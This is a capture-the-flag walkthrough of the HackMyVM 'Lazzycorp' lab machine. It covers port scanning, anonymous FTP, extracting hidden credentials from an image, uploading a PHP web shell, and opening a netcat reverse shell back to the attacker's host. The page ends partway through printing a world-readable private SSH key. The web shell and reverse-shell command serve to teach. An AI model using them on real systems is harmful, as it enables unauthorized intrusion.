@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/49212444?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="## Hackmyvm Lazzycorp
+Finding the IP address of the target host.">
+<meta property="og:title" content="Hackmyvm Lazzycorp">
+<meta property="og:description" content="## Hackmyvm Lazzycorp
+Finding the IP address of the target host.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://cyxteen.github.io/post/Hackmyvm%20Lazzycorp.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/49212444?v=4">
+<title>Hackmyvm Lazzycorp</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Hackmyvm Lazzycorp</h1>
+<div class="title-right">
+    <a href="https://cyxteen.github.io" id="buttonHome" class="btn btn-invisible circle" title="home">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/Cyxteen/cyxteen.github.io/issues/4" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="switch theme">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h2>Hackmyvm Lazzycorp</h2>
+<p>Finding the IP address of the target host. I used <code class="notranslate">10.9.9.0/24</code> because this is the subnet for all the security VMs</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » fping -agq 10.9.9.0/24
+
+---response---
+10.9.9.1
+10.9.9.12</pre></div>
+<h3>Information Collection</h3>
+<p>Using <code class="notranslate">nmap</code> to check for all the open ports.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » nmap -p- 10.9.9.12                                                                       1 ↵
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 12:02 EDT
+Nmap scan report <span class="pl-k">for</span> 10.9.9.12
+Host is up (0.0015s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</pre></div>
+<p>we see <code class="notranslate">FTP</code>, <code class="notranslate">SSH</code>, and <code class="notranslate">http</code> ports open. Service and version enumeration using <code class="notranslate">nmap</code> results to the following</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » nmap -sSVC -p21,22,80 10.9.9.12 -oA ./nmap/lazzycorp 
+
+---response---
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 12:26 EDT
+Nmap scan report <span class="pl-k">for</span> 10.9.9.12
+Host is up (0.0017s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+<span class="pl-k">|</span> ftp-syst:
+<span class="pl-k">|</span>   STAT:
+<span class="pl-k">|</span> FTP server status:
+<span class="pl-k">|</span>      Connected to ::ffff:10.6.6.5
+<span class="pl-k">|</span>      Logged <span class="pl-k">in</span> as ftp
+<span class="pl-k">|</span>      TYPE: ASCII
+<span class="pl-k">|</span>      No session bandwidth limit
+<span class="pl-k">|</span>      Session timeout <span class="pl-k">in</span> seconds is 300
+<span class="pl-k">|</span>      Control connection is plain text
+<span class="pl-k">|</span>      Data connections will be plain text
+<span class="pl-k">|</span>      At session startup, client count was 2
+<span class="pl-k">|</span>      vsFTPd 3.0.5 - secure, fast, stable
+<span class="pl-k">|</span>_End of status
+<span class="pl-k">|</span> ftp-anon: Anonymous FTP login allowed (FTP code 230)
+<span class="pl-k">|</span>_drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux<span class="pl-k">;</span> protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
+<span class="pl-k">|</span>   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
+<span class="pl-k">|</span>_  256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 <span class="pl-s"><span class="pl-pds">((</span>Ubuntu<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span> http-robots.txt: 2 disallowed entries
+<span class="pl-k">|</span>_/cms-admin.php /auth-LazyCorp-dev/
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.41 (Ubuntu)
+<span class="pl-k">|</span>_http-title: LazyCorp <span class="pl-k">|</span> Empowering Devs
+Service Info: OSs: Unix, Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel</pre></div>
+<p>The <code class="notranslate">-oA</code> is used to save the output in all supported <code class="notranslate">nmap</code> formats. Parsing the <code class="notranslate">nmap</code> output we can see that anonymous login to the <code class="notranslate">FTP</code> service is allowed. Also there's a <code class="notranslate">robots.txt</code> file in the web server.</p>
+<h4>1. Anonymous FTP Login</h4>
+<p>We can try to access the FTP service as the anonymous user using the following commands.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » ftp 10.9.9.12
+Connected to 10.9.9.12.
+220 (vsFTPd 3.0.5)
+Name (10.9.9.12:cyxteen): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.</pre></div>
+<p>Success we now have access to the FTP service and all it can offer. Checking for all the files in the file server we only have one folder (pub) where it contains one file (note.jpg). and we can save it to out attacker's machine.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ftp<span class="pl-k">&gt;</span> ls -la
+229 Entering Extended Passive Mode (<span class="pl-k">|||</span>60820<span class="pl-k">|</span>)
+150 Here comes the directory listing.
+dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 <span class="pl-c1">.</span>
+dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
+drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
+226 Directory send OK.
+ftp<span class="pl-k">&gt;</span> <span class="pl-c1">cd</span> pub
+250 Directory successfully changed.
+ftp<span class="pl-k">&gt;</span> ls -la
+229 Entering Extended Passive Mode (<span class="pl-k">|||</span>10442<span class="pl-k">|</span>)
+150 Here comes the directory listing.
+drwxr-xr-x    2 114      119          4096 Jul 16 12:35 <span class="pl-c1">.</span>
+dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
+-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
+226 Directory send OK.
+ftp<span class="pl-k">&gt;</span> get note.jpg
+local: note.jpg remote: note.jpg
+229 Entering Extended Passive Mode (<span class="pl-k">|||</span>19362<span class="pl-k">|</span>)
+150 Opening BINARY mode data connection <span class="pl-k">for</span> note.jpg (1366786 bytes).
+100% <span class="pl-k">|</span><span class="pl-k">**********************************************************************************</span><span class="pl-k">|</span>  1334 KiB   36.45 MiB/s    00:00 ETA
+226 Transfer complete.
+1366786 bytes received <span class="pl-k">in</span> 00:00 (34.71 MiB/s)</pre></div>
+<p>we have finally saved the file to our machine and we try to determine which kind of file we are dealing with.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » file note.jpg
+note.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2296x4080, components 3</pre></div>
+<p>This command verifies that the image file is indeed an image file and not another type of file disguised as an image file<br>
+try checking for human readable text within the image file using <code class="notranslate">strings</code> command.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » strings note.jpg <span class="pl-k">|</span> head
+JFIF
+
+<span class="pl-smi">$3</span>br
+<span class="pl-en">%&amp;'</span>()<span class="pl-k">*</span>456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+        <span class="pl-c"><span class="pl-c">#</span>3R</span>
+<span class="pl-k">&amp;</span><span class="pl-s"><span class="pl-pds">'</span>()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span>
+<span class="pl-s">6G$M</span>
+<span class="pl-s">&gt;c33</span>
+<span class="pl-s">_-q!</span></pre></div>
+<p>Running this command and observing the output nothing really stood out in the output. trying to uncover any unconventional hidden data using <code class="notranslate">exifool</code> still nothing was found.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » exiftool note.jpg
+ExifTool Version Number         <span class="pl-c1">:</span> 13.25
+File Name                       <span class="pl-c1">:</span> note.jpg
+Directory                       <span class="pl-c1">:</span> <span class="pl-c1">.</span>
+File Size                       <span class="pl-c1">:</span> 1367 kB
+File Modification Date/Time     <span class="pl-c1">:</span> 2025:07:16 08:35:22-04:00
+File Access Date/Time           <span class="pl-c1">:</span> 2025:08:20 12:36:51-04:00
+File Inode Change Date/Time     <span class="pl-c1">:</span> 2025:08:20 12:36:51-04:00
+File Permissions                <span class="pl-c1">:</span> -rw-rw-r--
+File Type                       <span class="pl-c1">:</span> JPEG
+File Type Extension             <span class="pl-c1">:</span> jpg
+MIME Type                       <span class="pl-c1">:</span> image/jpeg
+JFIF Version                    <span class="pl-c1">:</span> 1.01
+Resolution Unit                 <span class="pl-c1">:</span> None
+X Resolution                    <span class="pl-c1">:</span> 1
+Y Resolution                    <span class="pl-c1">:</span> 1
+Image Width                     <span class="pl-c1">:</span> 2296
+Image Height                    <span class="pl-c1">:</span> 4080
+Encoding Process                <span class="pl-c1">:</span> Baseline DCT, Huffman coding
+Bits Per Sample                 <span class="pl-c1">:</span> 8
+Color Components                <span class="pl-c1">:</span> 3
+Y Cb Cr Sub Sampling            <span class="pl-c1">:</span> YCbCr4:2:0 (2 2)
+Image Size                      <span class="pl-c1">:</span> 2296x4080
+Megapixels                      <span class="pl-c1">:</span> 9.4</pre></div>
+<p>At this time I though that I had tried every possible way to extract the secrets of the <code class="notranslate">note.jpg</code> file. Using the <code class="notranslate">eog</code> command to view the contents of the image file results to the following <code class="notranslate">The password of you username dev is shared 😊</code>.  the message was cryptic and made no sense. but as a last resort I tried running <code class="notranslate">stegseek</code> command on the image file</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » stegseek note.jpg
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+[i] Original filename: <span class="pl-s"><span class="pl-pds">"</span>creds.txt<span class="pl-pds">"</span></span>.
+[i] Extracting to <span class="pl-s"><span class="pl-pds">"</span>note.jpg.out<span class="pl-pds">"</span></span>.
+
+kali :: exercises/HMV/lazzycorp » la
+total 4.0G
+-rw-r--r-- 1 cyxteen cyxteen 2.1G Jul 21 02:58 lazzycorp.ova
+-rw-rw-r-- 1 cyxteen cyxteen 2.0G Aug 20 08:03 lazzycorp.zip
+drwxrwxr-x 2 cyxteen cyxteen 4.0K Aug 20 12:26 nmap
+-rw-rw-r-- 1 cyxteen cyxteen 1.4M Jul 16 08:35 note.jpg
+-rw-rw-r-- 1 cyxteen cyxteen   43 Aug 20 13:18 note.jpg.out
+-rw-rw-r-- 1 cyxteen cyxteen   12 Aug 20 12:58 users
+kali :: exercises/HMV/lazzycorp » cat note.jpg.out
+Username: dev
+Password: d3v3l0pm3nt<span class="pl-k">!</span>nt3rn</pre></div>
+<p>We now have the password and the username that it's associated with.<br>
+Visiting the web server we are provided with tips on how to get the password for the user dev and also we stumble upon another username <code class="notranslate">arvind</code>.<br>
+The <code class="notranslate">robots.txt</code> file exposes two paths. It's worth noting that web servers paths on Linux systems are case-sensitive.<br>
+Running <code class="notranslate">nikto</code> to scan the website for vulnerabilities</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » nikto -h http://10.9.9.12
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.9.9.12
++ Target Hostname:    10.9.9.12
++ Target Port:        80
++ Start Time:         2025-08-20 13:26:32 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="pl-k">in</span> a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use <span class="pl-s"><span class="pl-pds">'</span>-C all<span class="pl-pds">'</span></span> to force check all possible dirs)
++ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="pl-k">for</span> the 2.x branch.
++ /: Server may leak inodes via ETags, header found with file /, inode: 246, size: 639791cc4ffb8, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi<span class="pl-k">?</span>name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS <span class="pl-c1">.</span>
++ 8076 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2025-08-20 13:26:54 (GMT-4) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre></div>
+<p>The command has not uncovered anything serious or at least anything that we did not previously had an idea about.<br>
+Running the <code class="notranslate">feroxbuster</code> command on the paths that were exposed in the <code class="notranslate">robots.txt</code> file we finally get this output</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » feroxbuster -u http://10.9.9.12/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip,jpg,jpeg,png
+
+<span class="pl-k">&lt;</span>SNIP<span class="pl-k">&gt;</span>
+404      GET        9l       31w      271c http://10.9.9.12/auth-lazycorp-dev/auth-LazyCorp-dev
+404      GET        9l       31w      271c http://10.9.9.12/auth-lazycorp-dev/cms-admin.php
+404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter<span class="pl-k">;</span> toggle off with --dont-filter
+403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter<span class="pl-k">;</span> toggle off with --dont-filter
+200      GET       21l       53w      710c http://10.9.9.12/auth-lazycorp-dev/login.php
+301      GET        9l       28w      326c http://10.9.9.12/auth-lazycorp-dev/uploads =<span class="pl-k">&gt;</span> http://10.9.9.12/auth-lazycorp-dev/uploads/
+302      GET        0l        0w        0c http://10.9.9.12/auth-lazycorp-dev/dashboard.php =<span class="pl-k">&gt;</span> login.php</pre></div>
+<p>When we visit the <code class="notranslate">login.php</code> file we are greeted with a login page. Using the credentials obtained from the jpg file we can login as the user dev and explore the different features in the website.<br>
+After a successful login t the page, there's a file upload option. and since we did stumble upon an <code class="notranslate">uploads</code> directory we can can access the uploaded reverse shell from there.</p>
+<div class="highlight highlight-source-hack"><pre class="notranslate">&lt;<span class="pl-ent">html</span>&gt;
+&lt;<span class="pl-ent">body</span>&gt;
+&lt;<span class="pl-ent">form</span> <span class="pl-e">method</span>=<span class="pl-s"><span class="pl-pds">"</span>GET<span class="pl-pds">"</span></span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;<span class="pl-pds">"</span></span>&gt;
+&lt;<span class="pl-ent">input</span> <span class="pl-e">type</span>=<span class="pl-s"><span class="pl-pds">"</span>TEXT<span class="pl-pds">"</span></span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span> <span class="pl-e">id</span>=<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span> <span class="pl-e">size</span>=<span class="pl-s"><span class="pl-pds">"</span>80<span class="pl-pds">"</span></span>&gt;
+&lt;<span class="pl-ent">input</span> <span class="pl-e">type</span>=<span class="pl-s"><span class="pl-pds">"</span>SUBMIT<span class="pl-pds">"</span></span> <span class="pl-e">value</span>=<span class="pl-s"><span class="pl-pds">"</span>Execute<span class="pl-pds">"</span></span>&gt;
+&lt;/<span class="pl-ent">form</span>&gt;
+&lt;<span class="pl-ent">pre</span>&gt;
+<span class="pl-k">&lt;</span>?<span class="pl-c1">php</span>
+    <span class="pl-k">if</span>(<span class="pl-c1">isset</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>cmd<span class="pl-pds">'</span></span>]))
+    {
+        <span class="pl-c1">system</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>cmd<span class="pl-pds">'</span></span>]);
+    }
+?<span class="pl-k">&gt;</span>
+&lt;/<span class="pl-ent">pre</span>&gt;
+&lt;/<span class="pl-ent">body</span>&gt;
+&lt;<span class="pl-ent">script</span>&gt;<span class="pl-s1"><span class="pl-c1">document</span>.<span class="pl-c1">getElementById</span>(<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>).<span class="pl-c1">focus</span>();</span>&lt;/<span class="pl-ent">script</span>&gt;
+&lt;/<span class="pl-ent">html</span>&gt;</pre></div>
+<p>we can access the reverse shell in this URL <code class="notranslate">http://10.9.9.12/auth-lazycorp-dev/uploads/rev_shell.php?cmd=</code> and enter the command you want to execute on the target machine. This file gives you access to a remote control access. and in this case I decided to run a reverse shell command to call back to my kali machine <code class="notranslate">busybox nc 10.6.6.5 9001 -e sh</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: <span class="pl-k">~</span> » nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.6.6.5] from (UNKNOWN) [10.9.9.12] 33850
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>we get foothold access to the machine. Going through the web server is insecure in many ways such as hard coding credentials and no input validation</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-en">session_start</span>();
+<span class="pl-k">if</span> (<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SERVER</span></span>[<span class="pl-s">"<span class="pl-s">REQUEST_METHOD</span>"</span>] == <span class="pl-s">"<span class="pl-s">POST</span>"</span>) {
+    <span class="pl-k">if</span> (<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">username</span>'</span>] === <span class="pl-s">'<span class="pl-s">dev</span>'</span> &amp;&amp; <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">password</span>'</span>] === <span class="pl-s">'<span class="pl-s">d3v3l0pm3nt!nt3rn</span>'</span>) {
+        <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SESSION</span></span>[<span class="pl-s">'<span class="pl-s">loggedin</span>'</span>] = <span class="pl-c1">true</span>;
+        <span class="pl-en">header</span>(<span class="pl-s">"<span class="pl-s">Location: dashboard.php</span>"</span>);
+        <span class="pl-k">exit</span>;
+    } <span class="pl-k">else</span> {
+        <span class="pl-s1"><span class="pl-c1">$</span>error</span> = <span class="pl-s">"<span class="pl-s">Invalid credentials.</span>"</span>;
+    }
+}
+<span class="pl-ent">?&gt;</span></pre></div>
+<p>and this was how the webserver handled the file uploaded</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+  <span class="pl-k">if</span> (<span class="pl-en">isset</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_FILES</span></span>[<span class="pl-s">'<span class="pl-s">upload</span>'</span>])) {
+      <span class="pl-s1"><span class="pl-c1">$</span>target</span> = <span class="pl-s">"<span class="pl-s">uploads/</span>"</span> . <span class="pl-en">basename</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_FILES</span></span>[<span class="pl-s">'<span class="pl-s">upload</span>'</span>][<span class="pl-s">'<span class="pl-s">name</span>'</span>]);
+      <span class="pl-k">if</span> (<span class="pl-en">move_uploaded_file</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_FILES</span></span>[<span class="pl-s">'<span class="pl-s">upload</span>'</span>][<span class="pl-s">'<span class="pl-s">tmp_name</span>'</span>], <span class="pl-s1"><span class="pl-c1">$</span>target</span>)) {
+          <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">&lt;div class='alert alert-success mt-3'&gt;Upload successful!&lt;/div&gt;</span>"</span>;
+      } <span class="pl-k">else</span> {
+          <span class="pl-k">echo</span> <span class="pl-s">"<span class="pl-s">&lt;div class='alert alert-danger mt-3'&gt;Upload failed!&lt;/div&gt;</span>"</span>;
+      }
+  }
+  <span class="pl-ent">?&gt;</span></pre></div>
+<p>root flag is located in <code class="notranslate">arvind</code> directory</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">FLAG{you_got_foothold_nice}</pre></div>
+<h4>Privilege Escalation</h4>
+<p>Moving from <code class="notranslate">www-data</code> user to <code class="notranslate">arvind</code> upon visiting the <code class="notranslate">.ssh</code> file we learn that there are both ssh keys in the file and the permissions are set in a way that any logged in user can access them</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ls -la
+total 20
+drwxr-xr-x    2 arvind   arvind        4096 Jul  9 07:37 <span class="pl-c1">.</span>
+drwxr-xr-x    5 arvind   arvind        4096 Jul 16 12:49 ..
+-rw-------    1 arvind   arvind         747 Jul  9 07:47 authorized_keys
+-rw-r--r--    1 arvind   arvind        3389 Jul  9 07:37 id_rsa
+-rw-r--r--    1 arvind   arvind         747 Jul  9 07:37 id_rsa.pub
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
